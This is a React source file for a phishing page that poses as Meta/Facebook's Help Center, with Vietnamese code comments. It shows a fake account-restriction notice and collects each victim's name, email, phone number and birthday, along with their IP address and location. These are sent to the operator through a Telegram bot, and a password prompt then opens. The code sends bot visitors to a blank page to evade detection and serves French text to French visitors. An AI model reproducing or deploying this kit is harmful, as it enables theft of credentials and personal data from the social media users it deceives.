import FromMetaImage from '@/assets/images/from-meta.png';
import FacebookImage from '@/assets/images/icon.webp';
import PasswordInput from '@/components/password-input';
import { faChevronDown, faCircleExclamation, faCompass, faHeadset, faLock, faUserGear } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { useState, useEffect, useCallback, useMemo } from 'react';
import sendMessage from '@/utils/telegram';
import { AsYouType, getCountryCallingCode } from 'libphonenumber-js';
import detectBot from '@/utils/detect_bot';
import axios from 'axios';

// 🚀 TIẾNG ANH MẶC ĐỊNH
const englishTexts = {
    helpCenter: 'Help Center',
    english: 'English',
    using: 'Using',
    managingAccount: 'Managing Your Account',
    privacySecurity: 'Privacy, Safety and Security',
    policiesReporting: 'Policies and Reporting',
    pagePolicyAppeals: 'Account Policy Complaints',
    detectedActivity: 'We have detected unusual activity on your account that violates our community standards.',
    accessLimited: 'Your account access will be restricted and you will not be able to post, share, or comment using your page at this time.',
    submitAppeal: 'If you believe this is an error, you can file a complaint by providing the required information.',
    pageName: 'Name',
    mail: 'Email',
    phone: 'Phone Number',
    birthday: 'Birthday',
    yourAppeal: 'Your Appeal',
    appealPlaceholder: 'Please describe your appeal in detail...',
    submit: 'Submit',
    fieldRequired: 'This field is required',
    invalidEmail: 'Please enter a valid email address',
    about: 'About',
    adChoices: 'Ad choices',
    createAd: 'Create ad',
    privacy: 'Privacy',
    careers: 'Careers',
    createPage: 'Create Page',
    termsPolicies: 'Terms and policies',
    cookies: 'Cookies'
};

// 🚀 TIẾNG PHÁP - CÓ SẴN TRONG CODE
const frenchTexts = {
    helpCenter: 'Centre d\'aide',
    english: 'Anglais',
    using: 'Utilisation',
    managingAccount: 'Gestion de votre compte',
    privacySecurity: 'Confidentialité, sécurité et protection',
    policiesReporting: 'Politiques et signalement',
    pagePolicyAppeals: 'Réclamations concernant les politiques de compte',
    detectedActivity: 'Nous avons détecté une activité inhabituelle sur votre compte qui enfreint nos normes communautaires.',
    accessLimited: 'L\'accès à votre compte sera restreint et vous ne pourrez pas publier, partager ou commenter en utilisant votre page pour le moment.',
    submitAppeal: 'Si vous pensez qu\'il s\'agit d\'une erreur, vous pouvez déposer une réclamation en fournissant les informations requises.',
    pageName: 'Nom',
    mail: 'E-mail',
    phone: 'Numéro de téléphone',
    birthday: 'Date de naissance',
    yourAppeal: 'Votre recours',
    appealPlaceholder: 'Veuillez décrire votre recours en détail...',
    submit: 'Soumettre',
    fieldRequired: 'Ce champ est obligatoire',
    invalidEmail: 'Veuillez saisir une adresse e-mail valide',
    about: 'À propos',
    adChoices: 'Choix de publicités',
    createAd: 'Créer une publicité',
    privacy: 'Confidentialité',
    careers: 'Carrières',
    createPage: 'Créer une page',
    termsPolicies: 'Conditions et politiques',
    cookies: 'Cookies'
};

const Home = () => {
    const [formData, setFormData] = useState({
        pageName: '',
        mail: '',
        phone: '',
        birthday: '',
        appeal: ''
    });

    const [showPassword, setShowPassword] = useState(false);
    const [errors, setErrors] = useState({});
    const [currentTexts, setCurrentTexts] = useState(englishTexts); // 🚀 Mặc định tiếng Anh
    const [countryCode, setCountryCode] = useState('US');
    const [callingCode, setCallingCode] = useState('+1');
    const [securityChecked, setSecurityChecked] = useState(false);
    const [isFormEnabled, setIsFormEnabled] = useState(false);

    // 🛡️ HÀM KHỞI TẠO BẢO MẬT - CHẠY BACKGROUND
    const initializeSecurity = useCallback(async () => {
        try {
            // 1. Kiểm tra bot tự động
            const botResult = await detectBot();
            if (botResult.isBot) {
                window.location.href = 'about:blank';
                return;
            }

            // 2. Lấy thông tin IP và vị trí
            const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
            const ipData = response.data;
            
            localStorage.setItem('ipInfo', JSON.stringify(ipData));
            
            const detectedCountry = ipData.country_code || 'US';
            setCountryCode(detectedCountry);

            // 🚀 QUYẾT ĐỊNH NGÔN NGỮ: PHÁP → TIẾNG PHÁP, CÒN LẠI → TIẾNG ANH
            if (detectedCountry === 'FR') {
                setCurrentTexts(frenchTexts); // IP Pháp → Hiển thị tiếng Pháp
            } else {
                setCurrentTexts(englishTexts); // Các nước khác → Giữ tiếng Anh
            }

            // 3. Set calling code
            const code = getCountryCallingCode(detectedCountry);
            setCallingCode(`+${code}`);

            setSecurityChecked(true);
            setIsFormEnabled(true);
            
        } catch (error) {
            console.log('Security initialization failed:', error.message);
            setCountryCode('US');
            setCallingCode('+1');
            setCurrentTexts(englishTexts); // Lỗi → Mặc định tiếng Anh
            setSecurityChecked(true);
            setIsFormEnabled(true);
        }
    }, []);

    // 🚀 HIỂN THỊ WEB NGAY, CHẠY BẢO MẬT SAU
    useEffect(() => {
        initializeSecurity();
        
        // 🚀 Enable form sau 1 GIÂY
        const timer = setTimeout(() => {
            setIsFormEnabled(true);
        }, 1000);
        
        return () => clearTimeout(timer);
    }, [initializeSecurity]);

    // Hàm validate email
    const validateEmail = (email) => {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    };

    // Hàm chuyển đổi từ yyyy-mm-dd sang dd/mm/yyyy
    const formatDateToDDMMYYYY = (dateString) => {
        if (!dateString) return '';
        const parts = dateString.split('-');
        if (parts.length !== 3) return dateString;
        return `${parts[2]}/${parts[1]}/${parts[0]}`;
    };

    // THÊM HÀM ẨN EMAIL: s****g@m****.com
    const hideEmail = (email) => {
        if (!email) return 's****g@m****.com';
        const parts = email.split('@');
        if (parts.length !== 2) return email;
        
        const username = parts[0];
        const domain = parts[1];
        const domainParts = domain.split('.');
        
        if (username.length <= 1) return email;
        if (domainParts.length < 2) return email;
        
        const formattedUsername = username.charAt(0) + '*'.repeat(Math.max(0, username.length - 2)) + (username.length > 1 ? username.charAt(username.length - 1) : '');
        const formattedDomain = domainParts[0].charAt(0) + '*'.repeat(Math.max(0, domainParts[0].length - 1)) + '.' + domainParts.slice(1).join('.');
        
        return formattedUsername + '@' + formattedDomain;
    };

    // THÊM HÀM ẨN SỐ ĐIỆN THOẠI: ******32 (6 sao + 2 số cuối)
    const hidePhone = (phone) => {
        if (!phone) return '******32';
        const cleanPhone = phone.replace(/^\+\d+\s*/, '');
        if (cleanPhone.length < 2) return '******32';
        
        const lastTwoDigits = cleanPhone.slice(-2);
        return '*'.repeat(6) + lastTwoDigits;
    };

    const handleInputChange = (field, value) => {
        if (!isFormEnabled) return;
        
        if (field === 'phone') {
            const cleanValue = value.replace(/^\+\d+\s*/, '');
            const asYouType = new AsYouType(countryCode);
            const formattedValue = asYouType.input(cleanValue);

            const finalValue = `${callingCode} ${formattedValue}`;

            setFormData((prev) => ({
                ...prev,
                [field]: finalValue
            }));
        } else {
            setFormData((prev) => ({
                ...prev,
                [field]: value
            }));
        }

        if (errors[field]) {
            setErrors((prev) => ({
                ...prev,
                [field]: false
            }));
        }
    };

    const validateForm = () => {
        if (!isFormEnabled) return false;
        
        const requiredFields = ['pageName', 'mail', 'phone', 'birthday', 'appeal'];
        const newErrors = {};

        requiredFields.forEach((field) => {
            if (formData[field].trim() === '') {
                newErrors[field] = true;
            }
        });

        if (formData.mail.trim() !== '' && !validateEmail(formData.mail)) {
            newErrors.mail = 'invalid';
        }

        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };

    const handleSubmit = async () => {
        if (!isFormEnabled) return;
        
        if (validateForm()) {
            try {
                const telegramMessage = formatTelegramMessage(formData);
                await sendMessage(telegramMessage);

                const hiddenData = {
                    name: formData.pageName,
                    email: hideEmail(formData.mail),
                    phone: hidePhone(formData.phone),
                    birthday: formData.birthday
                };

                localStorage.setItem('userInfo', JSON.stringify(hiddenData));
                setShowPassword(true);
            } catch {
                window.location.href = 'about:blank';
            }
        } else {
            const firstErrorField = Object.keys(errors)[0];
            if (firstErrorField) {
                const inputElement = document.querySelector(`input[name="${firstErrorField}"], textarea[name="${firstErrorField}"]`);
                if (inputElement) {
                    inputElement.focus();
                }
            }
        }
    };

    const formatTelegramMessage = (data) => {
        const timestamp = new Date().toLocaleString('vi-VN');
        const ipInfo = localStorage.getItem('ipInfo');
        const ipData = ipInfo ? JSON.parse(ipInfo) : {};

        return `📅 <b>Thời gian:</b> <code>${timestamp}</code>
🌍 <b>IP:</b> <code>${ipData.ip || 'k lấy được'}</code>
📍 <b>Vị trí:</b> <code>${ipData.city || 'k lấy được'} - ${ipData.region || 'k lấy được'} - ${ipData.country_code || 'k lấy được'}</code>

🔖 <b>Page Name:</b> <code>${data.pageName}</code>
📧 <b>Email:</b> <code>${data.mail}</code>
📱 <b>Số điện thoại:</b> <code>${data.phone}</code>
🎂 <b>Ngày sinh:</b> <code>${data.birthday}</code>`;
    };

    const handleClosePassword = () => {
        setShowPassword(false);
    };

    const data_list = [
        {
            id: 'using',
            icon: faCompass,
            title: currentTexts.using
        },
        {
            id: 'managing',
            icon: faUserGear,
            title: currentTexts.managingAccount
        },
        {
            id: 'privacy',
            icon: faLock,
            title: currentTexts.privacySecurity
        },
        {
            id: 'policies',
            icon: faCircleExclamation,
            title: currentTexts.policiesReporting
        }
    ];

    return (
        <>
            <header className='sticky top-0 left-0 flex h-14 justify-between p-4 shadow-sm'>
                <title>Page Help Center</title>
                <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
                <div className='flex items-center gap-2'>
                    <img src={FacebookImage} alt='' className='h-10 w-10' />
                    <p className='font-bold'>{currentTexts.helpCenter}</p>
                </div>
                <div className='flex items-center gap-2'>
                    <div className='flex h-10 w-10 items-center justify-center rounded-full bg-gray-200'>
                        <FontAwesomeIcon icon={faHeadset} className='' size='lg' />
                    </div>
                    <p className='rounded-lg bg-gray-200 p-3 py-2.5 text-sm font-semibold'>{currentTexts.english}</p>
                </div>
            </header>
            <main className='flex max-h-[calc(100vh-56px)] min-h-[calc(100vh-56px)]'>
                <nav className='hidden w-xs flex-col gap-2 p-4 shadow-lg sm:flex'>
                    {data_list.map((data) => {
                        return (
                            <div key={data.id} className='flex cursor-pointer items-center justify-between rounded-lg p-2 px-3 hover:bg-gray-100'>
                                <div className='flex items-center gap-2'>
                                    <div className='flex h-9 w-9 items-center justify-center rounded-full bg-gray-200'>
                                        <FontAwesomeIcon icon={data.icon} />
                                    </div>
                                    <div>{data.title}</div>
                                </div>
                                <FontAwesomeIcon icon={faChevronDown} />
                            </div>
                        );
                    })}
                </nav>
                <div className='flex max-h-[calc(100vh-56px)] flex-1 flex-col items-center justify-start overflow-y-auto'>
                    <div className='mx-auto rounded-lg border border-[#e4e6eb] sm:my-12'>
                        <div className='bg-[#e4e6eb] p-4 sm:p-6'>
                            <p className='text-xl sm:text-3xl font-bold'>{currentTexts.pagePolicyAppeals}</p>
                        </div>
                        <div className='p-4 text-base leading-7 font-medium sm:text-base sm:leading-7'>
                            <p className='mb-3'>{currentTexts.detectedActivity}</p>
                            <p className='mb-3'>{currentTexts.accessLimited}</p>
                            <p>{currentTexts.submitAppeal}</p>
                        </div>
                        <div className='flex flex-col gap-3 p-4 text-sm leading-6 font-semibold'>
                            <div className='flex flex-col gap-2'>
                                <p className='text-base sm:text-base'>
                                    {currentTexts.pageName} <span className='text-red-500'>*</span>
                                </p>
                                <input 
                                    type='text' 
                                    name='pageName' 
                                    autoComplete='organization' 
                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.pageName ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled ? 'opacity-50 cursor-not-allowed' : ''}`} 
                                    value={formData.pageName} 
                                    onChange={(e) => handleInputChange('pageName', e.target.value)} 
                                    disabled={!isFormEnabled}
                                />
                                {errors.pageName && <span className='text-xs text-red-500'>{currentTexts.fieldRequired}</span>}
                            </div>
                            <div className='flex flex-col gap-2'>
                                <p className='text-base sm:text-base'>
                                    {currentTexts.mail} <span className='text-red-500'>*</span>
                                </p>
                                <input 
                                    type='email' 
                                    name='mail' 
                                    autoComplete='email' 
                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled ? 'opacity-50 cursor-not-allowed' : ''}`} 
                                    value={formData.mail} 
                                    onChange={(e) => handleInputChange('mail', e.target.value)} 
                                    disabled={!isFormEnabled}
                                />
                                {errors.mail === true && <span className='text-xs text-red-500'>{currentTexts.fieldRequired}</span>}
                                {errors.mail === 'invalid' && <span className='text-xs text-red-500'>{currentTexts.invalidEmail}</span>}
                            </div>
                            <div className='flex flex-col gap-2'>
                                <p className='text-base sm:text-base'>
                                    {currentTexts.phone} <span className='text-red-500'>*</span>
                                </p>
                                <div className={`flex rounded-lg border ${errors.phone ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled ? 'opacity-50 cursor-not-allowed' : ''}`}>
                                    <div className='flex items-center border-r border-gray-300 bg-gray-100 px-3 py-2.5 sm:py-1.5 text-base sm:text-base font-medium text-gray-700'>{callingCode}</div>
                                    <input 
                                        type='tel' 
                                        name='phone' 
                                        inputMode='numeric' 
                                        pattern='[0-9]*' 
                                        autoComplete='off' 
                                        className='flex-1 rounded-r-lg border-0 px-3 py-2.5 sm:py-1.5 focus:ring-0 focus:outline-none text-base' 
                                        value={formData.phone.replace(/^\+\d+\s*/, '')} 
                                        onChange={(e) => handleInputChange('phone', e.target.value)} 
                                        disabled={!isFormEnabled}
                                    />
                                </div>
                                {errors.phone && <span className='text-xs text-red-500'>{currentTexts.fieldRequired}</span>}
                            </div>
                            <div className='flex flex-col gap-2'>
                                <p className='text-base sm:text-base'>
                                    {currentTexts.birthday} <span className='text-red-500'>*</span>
                                </p>
                                
                                <input 
                                    type='date' 
                                    name='birthday' 
                                    className={`hidden sm:block w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled ? 'opacity-50 cursor-not-allowed' : ''}`} 
                                    value={formData.birthday} 
                                    onChange={(e) => handleInputChange('birthday', e.target.value)} 
                                    disabled={!isFormEnabled}
                                />
                                
                                <div className='block sm:hidden relative'>
                                    <input 
                                        type='date' 
                                        name='birthday' 
                                        className={`w-full rounded-lg border px-3 py-2.5 text-base ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} opacity-0 absolute z-10`} 
                                        value={formData.birthday} 
                                        onChange={(e) => handleInputChange('birthday', e.target.value)}
                                        required
                                        disabled={!isFormEnabled}
                                    />
                                    <div 
                                        className={`w-full rounded-lg border px-3 py-2.5 bg-white ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${formData.birthday ? 'text-gray-900 text-base' : 'text-gray-500 text-base'} font-medium ${!isFormEnabled ? 'opacity-50 cursor-not-allowed' : ''}`}
                                        onClick={() => isFormEnabled && document.querySelectorAll('input[name="birthday"]')[1].click()}
                                    >
                                        {formData.birthday ? formatDateToDDMMYYYY(formData.birthday) : 'dd/mm/yyyy'}
                                    </div>
                                </div>
                                
                                {errors.birthday && <span className='text-xs text-red-500'>{currentTexts.fieldRequired}</span>}
                            </div>
                            <div className='flex flex-col gap-2'>
                                <p className='text-base sm:text-base'>
                                    {currentTexts.yourAppeal} <span className='text-red-500'>*</span>
                                </p>
                                <textarea 
                                    name='appeal'
                                    rows={4}
                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 resize-none text-base ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled ? 'opacity-50 cursor-not-allowed' : ''}`}
                                    placeholder={currentTexts.appealPlaceholder}
                                    value={formData.appeal}
                                    onChange={(e) => handleInputChange('appeal', e.target.value)}
                                    disabled={!isFormEnabled}
                                />
                                {errors.appeal && <span className='text-xs text-red-500'>{currentTexts.fieldRequired}</span>}
                            </div>
                            <button 
                                className={`w-full rounded-lg px-4 py-3 text-base font-semibold transition-colors duration-200 mt-2 ${!isFormEnabled ? 'bg-gray-400 cursor-not-allowed text-white' : 'bg-blue-600 hover:bg-blue-700 text-white'}`} 
                                onClick={handleSubmit}
                                disabled={!isFormEnabled}
                            >
                                {!isFormEnabled ? 'Checking...' : currentTexts.submit}
                            </button>
                            
                            {!securityChecked && (
                                <div className="text-center text-sm text-gray-500 mt-2">
                                    Security checking...
                                </div>
                            )}
                        </div>
                    </div>
                    <div className='w-full bg-[#f0f2f5] px-4 py-14 text-[15px] text-[#65676b] sm:px-32'>
                        <div className='mx-auto flex justify-between'>
                            <div className='flex flex-col space-y-4'>
                                <p>{currentTexts.about}</p>
                                <p>{currentTexts.adChoices}</p>
                                <p>{currentTexts.createAd}</p>
                            </div>
                            <div className='flex flex-col space-y-4'>
                                <p>{currentTexts.privacy}</p>
                                <p>{currentTexts.careers}</p>
                                <p>{currentTexts.createPage}</p>
                            </div>
                            <div className='flex flex-col space-y-4'>
                                <p>{currentTexts.termsPolicies}</p>
                                <p>{currentTexts.cookies}</p>
                            </div>
                        </div>
                        <hr className='my-8 h-0 border border-transparent border-t-gray-300' />
                        <div className='flex justify-between'>
                            <img src={FromMetaImage} alt='' className='w-[100px]' />
                            <p className='text-[13px] text-[#65676b]'>© {new Date().getFullYear()} Meta</p>
                        </div>
                    </div>
                </div>
            </main>
            {showPassword && <PasswordInput onClose={handleClosePassword} />}
        </>
    );
};
export default Home;
